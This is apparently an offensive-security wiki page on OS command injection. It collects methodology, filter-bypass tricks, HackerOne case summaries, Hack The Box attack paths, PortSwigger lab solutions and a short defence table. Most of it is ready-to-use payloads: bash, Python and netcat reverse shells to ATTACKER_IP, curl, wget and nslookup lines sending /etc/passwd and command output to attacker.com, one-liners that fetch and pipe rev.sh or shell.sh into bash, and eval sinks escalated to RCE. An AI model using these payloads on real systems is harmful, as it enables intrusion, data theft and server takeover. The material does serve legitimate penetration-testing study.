---
title: "OS Command Injection"
type: technique
tags: [exploitation, h1, injection, linux, portswigger, rce, web, windows]
phase: exploitation
date_created: 2026-05-08
date_updated: 2026-05-13
sources: [ps-general-concepts, ps-labs-cmdi, h1-scraped-os-command-injection, h1-scraped-rce, 0xdf-linux-easy-web, payloadsallthethings-cmdi, git-payloadsallthethings, git-portswigger-all-labs]
---

# OS Command Injection

## What it is

OS command injection (also called shell injection) is a vulnerability that allows an attacker to execute arbitrary operating system commands on the server running an application, typically by appending shell metacharacters and additional commands to an input field that is passed to a system shell call.

## How it works

Some applications call out to OS commands to implement functionality (e.g., executing legacy scripts, running utilities, pinging hosts). When user-supplied input is concatenated into the shell command string without sanitisation, shell metacharacters like `&`, `;`, `|`, backticks, and `$(...)` cause the shell to interpret the injected text as additional commands to execute in the context of the web server process.

**Example vulnerable application:**
```
https://insecure-website.com/stockStatus?productID=381&storeID=29
```
Internally calls: `stockreport.pl 381 29`

Injecting `& whoami &` as `productID`:
```bash
stockreport.pl & whoami & 29
```
Output reveals the server runs as a specific OS user.

## Prerequisites

- Application passes user-supplied data to a system shell function (e.g., PHP `system()`, `exec()`, `passthru()`, `shell_exec()`, Python `os.system()`, `subprocess.run()` with `shell=True`)
- Input is not sanitised to remove or escape shell metacharacters
- Web server process has sufficient OS privileges to execute commands

## Methodology

### 1. Identify candidate injection points

Look for features that suggest OS command execution:
- File operations (conversion, resize, rename)
- Network utilities (ping, traceroute, DNS lookup)
- Legacy system integration
- Any parameter that resembles a filename, hostname, or system identifier

### 2. Probe with benign payloads

Use command separators combined with an observable command:

```bash
# URL-encoded & (most universal separator)
productID=381%26echo+aiwefwlguh%26
productID=381%26whoami%26

# Semicolon (Linux/Unix)
productID=381;echo test;

# Pipe
productID=381|whoami

# Double pipe (execute if previous fails)
productID=381||whoami

# Command substitution (backtick)
productID=`whoami`

# Command substitution ($(...))
productID=$(whoami)
```

Observe whether injected output appears in the response.

### 3. Verify with output-reflecting command

```bash
# Echo a unique string visible in page source
& echo aiwefwlguh &
; echo aiwefwlguh ;
| echo aiwefwlguh
```

The string appearing in the response confirms visible (in-band) command injection.

### 4. Blind command injection — time-based detection

When output is not returned, use time delays:

```bash
# Linux — pause 10 seconds
& sleep 10 &
; sleep 10 ;
| sleep 10

# Windows — ping localhost as delay
& ping -n 11 127.0.0.1 &
```

Measure the HTTP response time. A consistent delay confirms blind injection.

### 5. Blind command injection — OOB data exfiltration

Exfiltrate data via DNS (requires Burp Collaborator or interactsh):

```bash
# Linux — nslookup with embedded command output
& nslookup $(whoami).attacker.com &
& nslookup `cat /etc/passwd | base64`.attacker.com &

# curl to attacker HTTP server
& curl http://attacker.com/$(whoami) &
& curl -d "$(cat /etc/passwd)" http://attacker.com/ &

# wget
& wget http://attacker.com/?data=$(id | base64) &
```

### 6. Exploitation — information gathering

```bash
# Identity and privileges
whoami
id

# OS and kernel
uname -a                  # Linux
ver                        # Windows
cat /etc/os-release        # Linux distro

# Network
ifconfig                  # Linux
ipconfig /all              # Windows
netstat -an

# Running processes
ps -ef                    # Linux
tasklist                   # Windows

# Read sensitive files
cat /etc/passwd
cat /etc/shadow
cat /home/user/.ssh/id_rsa
```

## Key payloads / examples

### Command separator reference

| Separator | Behaviour | Supported on |
|-----------|-----------|-------------|
| `;` | Run A then B regardless | Unix/Linux |
| `&&` | Run B only if A succeeds | Unix/Linux, Windows |
| `\|\|` | Run B only if A fails | Unix/Linux, Windows |
| `&` | Run A in background, then B | Unix/Linux |
| `\|` | Pipe stdout of A to B | Unix/Linux, Windows |
| backtick `` `cmd` `` | Inline command substitution | Unix/Linux |
| `$(cmd)` | Inline command substitution | Unix/Linux |
| newline `%0a` | Statement terminator | Unix/Linux |

### Useful initial commands

| Purpose | Linux | Windows |
|---------|-------|---------|
| Current user | `whoami` | `whoami` |
| OS version | `uname -a` | `ver` |
| Network info | `ifconfig` | `ipconfig /all` |
| Connections | `netstat -an` | `netstat -an` |
| Processes | `ps -ef` | `tasklist` |

### Common injection positions

```bash
# After a numeric ID parameter
productID=1;whoami

# After a filename
file=test.txt;id

# In a hostname field
host=google.com;id

# URL-encoded version for address bar/GET
productID=1%3Bwhoami
productID=1%26whoami%26
```

### Reverse shell payloads

```bash
# Bash reverse shell
& bash -i >& /dev/tcp/ATTACKER_IP/4444 0>&1 &

# Python reverse shell
& python3 -c 'import os,pty,socket;s=socket.socket();s.connect(("ATTACKER_IP",4444));[os.dup2(s.fileno(),f) for f in (0,1,2)];pty.spawn("/bin/bash")' &

# Netcat
& nc ATTACKER_IP 4444 -e /bin/bash &
& mkfifo /tmp/f;nc ATTACKER_IP 4444 </tmp/f|/bin/sh >/tmp/f 2>&1;rm /tmp/f &
```

## Bypasses and variants

### Spaces are blocked

```bash
# Use IFS variable
cat${IFS}/etc/passwd
cat$IFS/etc/passwd

# Use brace expansion
{cat,/etc/passwd}

# Use tab (%09)
cat%09/etc/passwd
```

### Keywords are blocked

```bash
# Use variable indirection
c$()at /etc/passwd       # empty variable substitution
ca''t /etc/passwd        # empty single quotes
ca"t" /etc/passwd

# Base64 encode the command
echo "cat /etc/passwd" | base64    # gives Y2F0IC9ldGMvcGFzc3dk
$(echo Y2F0IC9ldGMvcGFzc3dk | base64 -d)

# Hex encoding
printf "\x63\x61\x74 /etc/passwd"   # \x63\x61\x74 = cat
cat `echo -e "\x2f\x65\x74\x63\x2f\x70\x61\x73\x73\x77\x64"`

# Bypass Characters Filter via Hex Encoding (xxd)
xxd -r -p <<< 2f6574632f706173737764
cat `xxd -r -ps <(echo 2f6574632f706173737764)`

# Brace Expansion Bypass
{cat,/etc/passwd}
{,ifconfig,eth0}

# Wildcards and Tilde Expansion
/???/??t /???/p??s??
echo ~+

# Random Case (Windows)
wHoAmi
```

### Output is not reflected (blind)

1. Time-based: inject `sleep 5` — confirm by response delay
2. OOB DNS: inject `nslookup $(whoami).yourdomain.burpcollaborator.net`
3. Write output to web root (if write permission exists): `; id > /var/www/html/out.txt ;` then retrieve `http://target/out.txt`
4. Time-based data exfiltration (char by char): `if [ $(whoami|cut -c 1) == s ]; then sleep 5; fi`
5. DNS-based data exfiltration (loops): `for i in $(ls /) ; do host "$i.attacker.com"; done`

### Backgrounding Long Running Commands

If a long running command gets killed due to timeout, use `nohup` to keep the process running:
```bash
nohup sleep 120 > /dev/null &
```

### Argument Injection / worstfit

Gain command execution when you can only append arguments. Example with `curl`:
```bash
curl http://[ATTACKER.DOMAIN.TLD]/ -o webshell.php
```

Can be combined with the **worstfit** technique using fullwidth double quotes (`U+FF02`) instead of regular double quotes (`U+0022`):
```bash
＂ --use-askpass=calc ＂
```

### Polyglot Command Injection

A payload that executes across multiple quote contexts (single quote, double quote, or no quote):
```bash
1;sleep${IFS}9;#${IFS}';sleep${IFS}9;#${IFS}";sleep${IFS}9;#${IFS}
/*$(sleep 5)`sleep 5``*/-sleep(5)-'/*$(sleep 5)`sleep 5` #*/-sleep(5)||'"||sleep(5)||"/*`*/
```

### Comment suffix to drop trailing arguments

When injected into a position where the shell appends additional positional arguments after the injection point, append `#` to comment out the remainder:

```bash
# SSH endpoint passes flags after the username field
0xdf;bash${IFS}/tmp/rev.sh#
# The # comments out: -p 22 hostname ...
```

### Newline and tab when common metacharacters are blocked

Blocklists targeting `;`, `&`, `|`, space, and backtick frequently omit `%0a` (newline) and `%09` (tab):

```bash
# Newline (%0a) as command separator; tab (%09) as space substitute
0xdf%0acurl%09http://ATTACKER/rev.sh%0abash%09rev.sh
```

Always include `%0a` and `%09` when testing filter completeness.

### IPv4 address as integer (dotless payloads)

In DNS injection contexts or filters rejecting `.` characters in IP addresses:

```bash
# Convert: python3 -c "import struct,socket; print(struct.unpack('!I', socket.inet_aton('10.10.14.8'))[0])"
# 10.10.14.8 → 168431112

bash -i >& /dev/tcp/168431112/443 0>&1
```

### Partial regex anchor (`re.match` does not validate the full string)

Python `re.match` anchors only at the *start* of the input, not the end. A pattern without a trailing `$` is satisfied by any string with a valid prefix:

```bash
# Vulnerable validation (no $ anchor)
re.match(r"[a-zA-Z0-9@.+-]+", email)

# Bypass: valid prefix satisfies re.match; injection follows
0xdf@host.htb; bash -c 'bash -i >& /dev/tcp/ATTACKER/443 0>&1'
```

Fix: use `re.fullmatch` or end the pattern with `$`.

### `file://` scheme preserves injected filenames into `os.system()`

When an application accepts a URL parameter and passes it to `os.system()`, the `file://` scheme bypasses HTTP library sanitisation and delivers the raw path — including shell metacharacters — directly to the shell:

```bash
# HTTP/HTTPS: fetched via requests library (safe)
# file://: raw path passed to os.system() — metacharacters in path execute
image_url=file:///var/www/static/img/test.jpg; curl http://ATTACKER/shell.sh|bash;
```

## Real-World Examples (HackerOne — paid reports)

The following patterns are drawn from disclosed HackerOne reports. This category has 16 critical reports and a top bounty of $33,510 — all of them achieved full RCE on production infrastructure.

### Pattern 1 — Archive/import pipeline passes unsanitised filename to shell (GitLab, $33,510 critical)

**Reports:** [#1609965](https://hackerone.com/reports/1609965) and [#1679624](https://hackerone.com/reports/1679624) — GitLab BulkImports (`DecompressedArchiveSizeValidator`) and GitHub import.

The `DecompressedArchiveSizeValidator` ran a shell command that incorporated the archive filename without sanitisation. An attacker with access to the import feature could supply a crafted archive name containing shell metacharacters to achieve arbitrary command execution on GitLab servers. Both reports earned the maximum GitLab bounty of $33,510.

The GitHub import variant exploited the `Sawyer` HTTP library: an attacker could pass a `Sawyer::Resource` object with a controllable hash to the Redis gem, which called `.to_s` on it to build RESP protocol commands. Combined with a `Marshal.load` deserialization gadget, this chained into full RCE.

**Takeaway:** Import/export pipelines are a prime attack surface — they process attacker-controlled file names, archive contents, and remote URLs. Any shell call inside an archive processing flow must treat filenames as untrusted data.

### Pattern 2 — Git flag injection via user-controlled repository URL (GitLab, $12,000 critical)

**Reports:** [#658013](https://hackerone.com/reports/658013), [#587854](https://hackerone.com/reports/587854), [#298873](https://hackerone.com/reports/298873).

GitLab's repository import/mirror feature passed user-supplied repository URLs to the `git` binary without stripping leading dashes or shell metacharacters. This enabled flag injection (`--upload-pack`, `--config`, etc.) and in some cases allowed overwriting arbitrary files on the server (e.g., `~/.ssh/authorized_keys`), which then yielded SSH-based command execution. Three separate reports across different git operations each earned $2,000–$12,000.

**Takeaway:** Any time user input is appended to a command that invokes a subprocess, prefix `--` to separate flags from arguments, and enforce a URL allowlist that rejects arguments starting with `-`. File-overwrite primitives trivially escalate to RCE via SSH key injection.

### Pattern 3 — Pre-auth RCE on VPN appliance (Twitter/X, $20,160 critical)

**Report:** [#591295](https://hackerone.com/reports/591295) — Twitter VPN server.

A command injection flaw in the SSL VPN service was exploitable without authentication. Because VPN servers are by design reachable from the internet, the pre-authentication attack surface made this extremely high severity — an unauthenticated attacker on the public internet could gain a shell on internal Twitter infrastructure. Bounty: $20,160.

**Takeaway:** Network perimeter devices (VPN gateways, firewalls, load balancers) that accept unauthenticated input and call OS commands are the highest-value CMDi targets. One pre-auth RCE on a VPN gateway can be the initial foothold for a full network compromise.

### Pattern 4 — Exposed Kubernetes API leads to RCE and credential theft (Snapchat, $25,000 critical)

**Report:** [#455645](https://hackerone.com/reports/455645) — Snapchat.

A publicly accessible Kubernetes API server had no authentication required. An attacker could exec into running pods to execute arbitrary commands and access service account credentials and application secrets stored in the cluster. This represents a CMDi-class impact (arbitrary command execution on production hosts) achieved through infrastructure misconfiguration rather than a code-level injection flaw.

**Takeaway:** Kubernetes `exec` and `port-forward` endpoints must be authentication-gated. An exposed API server is equivalent to unauthenticated RCE across all nodes in the cluster.

### Pattern 5 — Unsanitised `package` field passed to system command (Linux Foundation / Hyperledger, $2,000 critical)

**Report:** [#1705717](https://hackerone.com/reports/1705717) — `indy-node` (Linux Foundation Decentralized Trust).

The `POOL_UPGRADE` request handler in the Hyperledger Indy node software processed an undocumented `package` field from incoming network requests. The value was passed directly to a system command without sanitisation to trigger package upgrades. An unauthenticated attacker on the network could inject arbitrary commands via this field, potentially taking control of every node in the decentralised network. Bounty: $2,000 critical.

**Takeaway:** Undocumented or internal protocol fields are often the least-reviewed attack surface. Any message handler that invokes system commands must treat every field as untrusted, even if not exposed in public documentation.

### Pattern 6 — Pre-auth CMDi on SSL VPN (Uber, $2,000 critical)

**Report:** [#540242](https://hackerone.com/reports/540242) — Uber SSL VPN servers.

Multiple Uber SSL VPN endpoints were found to have command injection vulnerabilities exploitable without authentication. Similar to the Twitter VPN case above, the pre-auth nature made this critical despite a lower bounty ceiling, as it provided direct access to Uber's internal network edge.

**Takeaway:** SSL VPN software frequently has command injection in authentication flows, certificate handling, and redirect parameters. These should be top-priority targets when doing external-perimeter testing.

<!-- additional from rce category -->

### Pattern 7 — Dependency confusion / npm namespace squatting (LY Corporation, $11,500 critical)

**Report:** [#1043385](https://hackerone.com/reports/1043385) — LY Corporation (formerly LINE).

A private npm package name used internally was not claimed on the public npm registry under the same name. The researcher registered a higher-versioned public package with the same name. When the CI/CD pipeline ran `npm install`, npm's default public-registry preference caused it to download and execute the attacker's package instead of the internal one — yielding arbitrary code execution on CI build hosts and potentially on production servers.

**Takeaway:** Dependency confusion attacks require no injection flaw in application code. Audit all private package names against public registries and claim them defensively, or use `--registry` flags and `.npmrc` scoping to force internal registry usage. Affects npm, PyPI, RubyGems, and other ecosystems.

### Pattern 8 — CI/CD build cache poisoning (Mozilla, $8,000 critical)

**Report:** [#2255750](https://hackerone.com/reports/2255750) — Mozilla (`mozilla/fxa`).

An attacker with the ability to push to the repository could re-upload a modified CI build cache artifact to a cache backend. The next CI run would restore and execute the poisoned cache, resulting in RCE within the build environment and exfiltration of secret tokens present in CI environment variables. This required repository contributor access but demonstrates how CI supply-chain attacks achieve RCE on infrastructure.

**Takeaway:** CI cache artifacts are executable trust boundaries. Treat cache restore steps with the same security rigour as code execution, use cryptographic integrity checks on cache artifacts, and never mix high-privilege secret injection with mutable cache layers.

## From the Wild

### HTB — CozyHosting (2023)
- **Technique variant**: Space filter + trailing argument bypass in Spring Boot
- **Attack path**: `/executessh` passes `username` to an SSH command; spaces blocked; bypass with `${IFS}` for spaces and `#` to drop trailing SSH flags: `0xdf;curl${IFS}http://ATTACKER/rev.sh${IFS}-o${IFS}/tmp/rev.sh#` then `0xdf;bash${IFS}/tmp/rev.sh#`

### HTB — Dynstr (2021)
- **Technique variant**: Dotless IP encoding in DNS subdomain injection
- **Attack path**: `hostname` GET parameter injected into `nsupdate` via echo pipe; dots in payload forbidden (breaks DNS label); convert attacker IP to 32-bit integer (`10.10.14.8` → `168431112`); payload: `$(/bin/bash -c "bash -i >& /dev/tcp/168431112/443 0>&1").no-ip.htb`

### HTB — Nocturnal (2025)
- **Technique variant**: Newline + tab bypass against near-complete blocklist
- **Attack path**: `proc_open` password field blocks `;`, `&`, `|`, space, backtick, `{`, `}` but not `%0a` or `%09`; payload: `0xdf%0abash%09-c%09"curl%09http://ATTACKER/rev.sh"%0abash%09rev.sh`

### HTB — OnlyForYou (2023)
- **Technique variant**: `re.match` partial anchor bypass in email validation
- **Attack path**: Flask contact form runs `dig txt {domain}` on the `@host` portion of the email; `re.match` only validates the start of the string; append injection after valid prefix: `0xdf@only4you.htb; bash -c 'bash -i >& /dev/tcp/ATTACKER/443 0>&1'`

### HTB — Doctor (2020)
- **Technique variant**: `$IFS` inside URL-embedded subshell
- **Attack path**: URL regex rejects literal spaces; embed command in `$()` subshell inside the URL field to avoid the space check: `http://ATTACKER/$(nc.traditional$IFS-e$IFS'/bin/bash'$IFS'ATTACKER'$IFS'443')`

### HTB — Writer (2021)
- **Technique variant**: `file://` protocol routes filename to `os.system()`
- **Attack path**: Image URL parameter; HTTP/HTTPS paths are fetched safely by `requests`; `file://` paths go directly into `os.system("mv {} {}.jpg")` with the raw path including metacharacters: `file:///var/www/static/img/test.jpg; curl http://ATTACKER/shell.sh|bash;`

### HTB — ScriptKiddie (2021)
- **Technique variant**: Log file injection into cron-parsed shell script
- **Attack path**: `scanlosers.sh` extracts field 3+ from `hackers` log via `cut` and passes it to `nmap`; craft log entry with injection in field 3: `x x x 127.0.0.1; bash -c 'bash -i >& /dev/tcp/ATTACKER/443 0>&1' # .`; `#` comments out nmap's output redirects

### HTB — Mentor (2022)
- **Technique variant**: Alpine Linux container — standard shells unavailable
- **Attack path**: FastAPI admin endpoint injects `path` JSON field into a shell command; Alpine has no `/bin/bash` and non-GNU curl; switch to Python raw socket shell: `python -c 'import os,pty,socket;s=socket.socket();s.connect(("ATTACKER",443));[os.dup2(s.fileno(),f) for f in(0,1,2)];pty.spawn("/bin/sh")'`

## Detection and defence

| Defence | Detail |
|---------|--------|
| **Avoid shell calls entirely** | Prefer language-native libraries over shell functions where possible. No shell = no shell injection. |
| **Input validation / allowlisting** | For fields accepting hostnames, IDs, or filenames — enforce strict character allowlists (e.g., `[a-zA-Z0-9-.]` for hostnames). |
| **Never pass user input to shell functions** | If shell is unavoidable, pass arguments as an array (e.g., Python `subprocess.run(["cmd", arg])` not `shell=True`). |
| **Least privilege** | Run web application as a restricted OS user with no shell access where possible. |
| **WAF / input filtering** | Block or escape `;`, `&`, `|`, backtick, `$()`, newline in parameters expected to be identifiers. |
| **Output encoding** | Do not reflect raw command output to users — reduces information leakage even if injection occurs. |

## Tools

- [[burp-suite]] — intercept requests, test blind injection via Collaborator (OOB DNS/HTTP)
- `interactsh` / Burp Collaborator — OOB callback server for blind injection detection
- Manual testing via `curl` or browser developer tools

```bash
# Test blind injection — time-based with curl
curl -s "http://target/stockStatus?productID=381%3Bsleep%2010%3B&storeID=29" -w "Time: %{time_total}\n"

# Test visible injection
curl -s "http://target/stockStatus?productID=381%26echo%20TEST%26&storeID=29"
```

## Payload reference (PayloadsAllTheThings)

Bypass variants from PAT for space and keyword filters, variable expansion tricks, and time-based exfiltration patterns that complement the filter bypass section above.

### Variable and expansion tricks

```bash
# $@ expands to nothing — splits keywords
who$@ami
w'h'o'am'i      # single quotes break blocklist matching
w"h"o"am"i      # double quotes
wh``oami        # empty backtick

# Extract characters from environment variables
${HOME:0:1}     # first char of $HOME is /
${OLDPWD:0:1}   # another / source

# Wildcard-based command finding
/???/??t /???/p??s??    # resolves to /bin/cat /etc/passwd
```

### ANSI-C quoting bypass

```bash
$'uname\x20-a'      # \x20 = space; bypasses literal space blocklist
$'cat /etc/passwd'   # Unicode escape for 'a'
```

### Time-based char-by-char extraction

```bash
# Conditional sleep — extract first character of /etc/passwd
if [ $(cut -c1 /etc/passwd) = r ]; then sleep 5; fi

# DNS exfiltration loop
for i in $(cat /etc/passwd | base64 | tr -d '\n' | fold -w 30); do
  nslookup "$i.attacker.com"
done
```

### Backgrounding to survive timeouts

```bash
nohup sleep 120 > /dev/null &
nohup bash -c 'bash -i >& /dev/tcp/ATTACKER/443 0>&1' > /dev/null &
```

## PortSwigger Labs

### Lab 1 — OS command injection, simple case (Apprentice)

The stock-check feature passes `productID` and `storeID` to a shell command. `productID` returns an error on injection; `storeID` is the vulnerable parameter.

```bash
# Inject whoami via storeID — output appears in HTTP response
storeID=1|whoami
```

---

### Lab 2 — Blind OS command injection with time delays (Practitioner)

Feedback form parameters (`name`, `email`, `subject`, `message`) are passed to a shell. No output is returned. Use time delay to confirm.

```bash
# email parameter — 10-second delay confirms blind injection
email=x||ping+-c+10+127.0.0.1||
email=x & sleep 10 &

# Append # to comment out any trailing shell arguments
email=x & sleep 10 #
```

Detection method: measure HTTP response time — a consistent 10-second delay confirms the `email` field is injectable.

---

### Lab 3 — Blind OS command injection with output redirection (Practitioner)

Feedback form is vulnerable in the `email` parameter. The web server serves images from `/var/www/images/` via a `GET /image?filename=` endpoint — redirect command output there to retrieve it.

```bash
# Step 1 — Inject via email parameter to redirect output to web root
email=x||whoami>/var/www/images/whoami.txt||

# Step 2 — Retrieve the file via the image endpoint
GET /image?filename=whoami.txt
```

The response body contains the OS username (e.g., `peter-5fYwD0`), confirming execution.

Key insight: look for any existing file-serving endpoint (images, downloads, static assets) whose base directory is writable by the web process. That directory is the redirect target.

---

### Lab 4 — Blind OS command injection with out-of-band interaction (Practitioner)

No output or time delay is observable. Use Burp Collaborator to receive an OOB DNS callback confirming execution.

```bash
# email parameter — triggers DNS lookup to Collaborator domain
email=x||nslookup+COLLABORATOR.oastify.com||

# Alternative with subshell (if || is blocked)
email=x$(nslookup COLLABORATOR.oastify.com)
```

Confirm by observing a DNS interaction appear in the Burp Collaborator tab.

---

### Lab 5 — Blind OS command injection with out-of-band data exfiltration (Practitioner)

Extends Lab 4 by embedding command output as a DNS subdomain to exfiltrate data through the OOB channel.

```bash
# Subshell variant — $(nslookup `whoami`.COLLABORATOR) exfiltrates whoami output as DNS label
email=x$(nslookup+`whoami`.COLLABORATOR.oastify.com)

# Backtick variant (same effect)
email=x||nslookup+`whoami`.COLLABORATOR.oastify.com||
```

The Collaborator receives a DNS lookup for `<username>.COLLABORATOR.oastify.com` — the subdomain prefix is the command output (e.g., `peter-0B6BNY`).

Note: the backtick form embeds the inner command result as a DNS label; the `$(…)` and backtick forms are equivalent. Use whichever is not blocked by the target.

---

## Sources

| Source | Content covered |
|--------|----------------|
| PortSwigger General Concepts — OS Command Injection | Shell injection definition, command separators, useful initial commands, `&` injection example |
| PortSwigger Lab 1 — OS command injection simple case | URL-encoding `&` to execute commands in `productID` parameter |
| git-portswigger-all-labs — Command_injection labs | Lab 2 time-delay blind (ping/sleep, email param, # comment); Lab 3 output redirection to /var/www/images/ + retrieval via /image endpoint; Lab 4 OOB DNS interaction via nslookup + Collaborator; Lab 5 OOB data exfiltration via whoami embedded as DNS subdomain label |

## Wired sub-techniques

<!-- auto-wired: context-reachable sub-technique pages -->
- [[latex-injection]]

## Server-side eval/exec sink (fixed-response detection)

An endpoint that returns a FIXED message/200 for every input may be passing a specific parameter to
`eval()` / a language interpreter and swallowing the error. **Response-diff parameter mining misses
this** - an invalid payload errors internally and yields the same fixed response, so it gets filtered
out. Detect with an actual PAYLOAD + OOB callback, and test BOTH the query string AND the body (the
sink is frequently reachable via only one of them):

```bash
# Node.js eval sink -> RCE via child_process (query-string param on a POST endpoint):
curl -sG -X POST --data-urlencode 'cmd=require("child_process").exec("curl http://OOB/x")' TARGET
#   an OOB callback confirms the sink; then swap in a reverse shell:
#   require("child_process").exec("rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc LHOST PORT >/tmp/f")
```

Python `eval`/`exec` sinks: probe `__import__("os").system("curl http://OOB/x")`; Ruby `eval`: backticks
`` `curl http://OOB/x` ``. Always OOB-gate a fixed-response sink before claiming - the response never
changes, so the callback is the only proof.

<!-- promoted-slug: nodejs-eval-sink-detection -->

## Blind exfil on a minimal target (busybox / embedded router)

The blind-exfil examples above assume `base64` exists and the shell tolerates the payload. On a
stripped busybox target (embedded router httpd, IoT firmware) that assumption fails:

- **`base64` is often absent** -> `$(id | base64)` produces nothing; exfil the raw output instead.
- **A newline in the output breaks the GET request line** -> the substituted output must be a
  SINGLE space-free token. Prefer files with one line (`/root/flag.txt`) or a token-yielding
  command; avoid multi-line dumps.
- **Put the token in the URL PATH, not a query with spaces**, to a listener you control:

```
# attacker
python3 -m http.server 80
# target (blind), + = URL-encoded space in the injected param:
wget+http://ATTACKER/$(cat+/root/flag.txt)
wget+http://ATTACKER/$(cat+/etc/passwd)     # multi-line -> only first line lands; loop per-line if needed
```

The request path in your `http.server` log is the output. Confirmed against embedded router
web-admin command injection (see [[firmware-hardware]]).

<!-- promoted-slug: busybox-blind-exfil-caveat -->

## Prefix-allowlist sink: chain off the required leading command

A sink guarded with `strpos($cmd, 'date') === 0` (or an equivalent "must start with X"
check in any language) only validates the FIRST token, not the whole string. Satisfy the
prefix, then chain a separator to run anything after it:

```bash
# strpos($cmd,'date')===0 lets anything through as long as it STARTS with "date"
date;<cmd>
date&&<cmd>
date|<cmd>
```

The same shape recurs as `startswith()`/`.StartsWith()`/`^date` regex-anchor checks —
whenever a command sink only anchors the prefix, treat it the same as an unanchored sink
once you supply that prefix. See also `## Partial regex anchor` above for the input-
validation sibling of this bug (a missing trailing `$`/`.fullmatch`).

<!-- promoted-slug: prefix-allowlist-command-chain -->
